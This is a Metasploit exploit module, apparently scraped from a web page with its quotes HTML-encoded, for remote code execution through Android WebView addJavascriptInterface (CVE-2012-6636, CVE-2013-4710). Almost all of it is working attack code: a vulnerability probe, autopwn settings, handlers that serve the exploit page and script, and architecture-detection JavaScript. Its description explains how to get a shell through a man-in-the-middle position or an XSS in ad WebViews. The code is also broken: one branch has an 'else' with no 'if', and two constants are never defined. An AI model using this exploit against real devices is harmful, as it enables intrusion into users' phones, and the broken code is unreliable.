# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/exploit/android&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Android
 
  VULN_CHECK_JS = %Q|
    for (i in top) {
      try {
        top[i].getClass().forName(&#039;java.lang.Runtime&#039;);
        is_vuln = true; break;
      } catch(e) {}
    }
  |
 
  autopwn_info(
    :os_name    => OperatingSystems::Match::ANDROID,
    :arch       => ARCH_ARMLE,
    :javascript => true,
    :rank       => ExcellentRanking,
    :vuln_test  => VULN_CHECK_JS
  )
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Android Browser and WebView addJavascriptInterface Code Execution&#039;,
      &#039;Description&#039;         => %q{
            This module exploits a privilege escalation issue in Android < 4.2&#039;s WebView component
          that arises when untrusted Javascript code is executed by a WebView that has one or more
          Interfaces added to it. The untrusted Javascript code can call into the Java Reflection
          APIs exposed by the Interface and execute arbitrary commands.
 
          Some distributions of the Android Browser app have an addJavascriptInterface
          call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs
          4.1.2 release of Android is known to be vulnerable.
 
          A secondary attack vector involves the WebViews embedded inside a large number
          of Android applications. Ad integrations are perhaps the worst offender here.
          If you can MITM the WebView&#039;s HTTP connection, or if you can get a persistent XSS
          into the page displayed in the WebView, then you can inject the html/js served
          by this module and get a shell.
 
          Note: Adding a .js to the URL will return plain javascript (no HTML markup).
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              => [
        &#039;jduck&#039;, # original msf module
        &#039;joev&#039;   # static server
      ],
      &#039;References&#039;          => [
        [&#039;URL&#039;, &#039;http://blog.trustlook.com/2013/09/04/alert-android-webview-addjavascriptinterface-code-execution-vulnerability/&#039;],
        [&#039;URL&#039;, &#039;https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/&#039;],
        [&#039;URL&#039;, &#039;http://50.56.33.56/blog/?p=314&#039;],
        [&#039;URL&#039;, &#039;https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/&#039;],
        [&#039;URL&#039;, &#039;https://github.com/mwrlabs/drozer/blob/bcadf5c3fd08c4becf84ed34302a41d7b5e9db63/src/drozer/modules/exploit/mitm/addJavaScriptInterface.py&#039;],
        [&#039;CVE&#039;, &#039;2012-6636&#039;], # original CVE for addJavascriptInterface
        [&#039;CVE&#039;, &#039;2013-4710&#039;], # native browser addJavascriptInterface (searchBoxJavaBridge_)
        [&#039;EDB&#039;, &#039;31519&#039;],
        [&#039;OSVDB&#039;, &#039;97520&#039;]
      ],
      &#039;Platform&#039;            => [&#039;android&#039;, &#039;linux&#039;],
      &#039;Arch&#039;                => [ARCH_DALVIK, ARCH_X86, ARCH_ARMLE, ARCH_MIPSLE],
      &#039;Targets&#039;             => [ [ &#039;Automatic&#039;, {} ] ],
      &#039;DisclosureDate&#039;      => &#039;Dec 21 2012&#039;,
      &#039;DefaultTarget&#039;       => 0,
      &#039;BrowserRequirements&#039; => {
        :source     => &#039;script&#039;,
        :os_name    => OperatingSystems::Match::ANDROID,
        :vuln_test  => VULN_CHECK_JS,
        :vuln_test_error => &#039;No vulnerable Java objects were found in this web context.&#039;
      }
    ))
 
    deregister_options(&#039;JsObfuscate&#039;)
  end
 
  # on requests for the static javascript file
  def on_request_uri(cli, req)
    if req.uri =~ /\.js/
      serve_static_js(cli, req)
    else
      super
    end
  end
 
  # The browser appears to be vulnerable, serve the exploit
  def on_request_exploit(cli, req, browser)
    arch = normalize_arch(browser[:arch])
    print_status "Serving #{arch} exploit..."
    send_response_html(cli, html(arch))
  end
 
  # Called when a client requests a .js route.
  # This is handy for post-XSS.
  def serve_static_js(cli, req)
    arch          = req.qstring[&#039;arch&#039;]
    response_opts = { &#039;Content-type&#039; => &#039;text/javascript&#039; }
 
      print_status("Serving javascript for arch #{normalize_arch arch}")
      send_response(cli, add_javascript_interface_exploit_js(normalize_arch arch), response_opts)
    else
      print_status("Serving arch detection javascript")
      send_response(cli, static_arch_detect_js, response_opts)
    end
  end
 
  # This is served to requests for the static .js file.
  # Because we have to use javascript to detect arch, we have 3 different
  # versions of the static .js file (x86/mips/arm) to choose from. This
  # small snippet of js detects the arch and requests the correct file.
  def static_arch_detect_js
    %Q|
      var arches = {};
      arches[&#039;#{ARCH_ARMLE}&#039;]  = /arm/i;
      arches[&#039;#{ARCH_MIPSLE}&#039;] = /mips/i;
      arches[&#039;#{ARCH_X86}&#039;]    = /x86/i;
 
      var arch = null;
      for (var name in arches) {
        if (navigator.platform.toString().match(arches[name])) {
          arch = name;
          break;
        }
      }
 
      if (arch) {
        // load the script with the correct arch
        var script = document.createElement(&#039;script&#039;);
        script.setAttribute(&#039;src&#039;, &#039;#{get_uri}/#{Rex::Text::rand_text_alpha(5)}.js?arch=&#039;+arch);
        script.setAttribute(&#039;type&#039;, &#039;text/javascript&#039;);
 
        // ensure body is parsed and we won&#039;t be in an uninitialized state
        setTimeout(function(){
          var node = document.body \|\| document.head;
          node.appendChild(script);
        }, 100);
      }
    |
  end
 
  # @return [String] normalized client architecture
  def normalize_arch(arch)
    if SUPPORTED_ARCHES.include?(arch) then arch else DEFAULT_ARCH end
  end
 
  def html(arch)
    "<!doctype html><html><body><script>#{add_javascript_interface_exploit_js(arch)}</script></body></html>"
  end
end

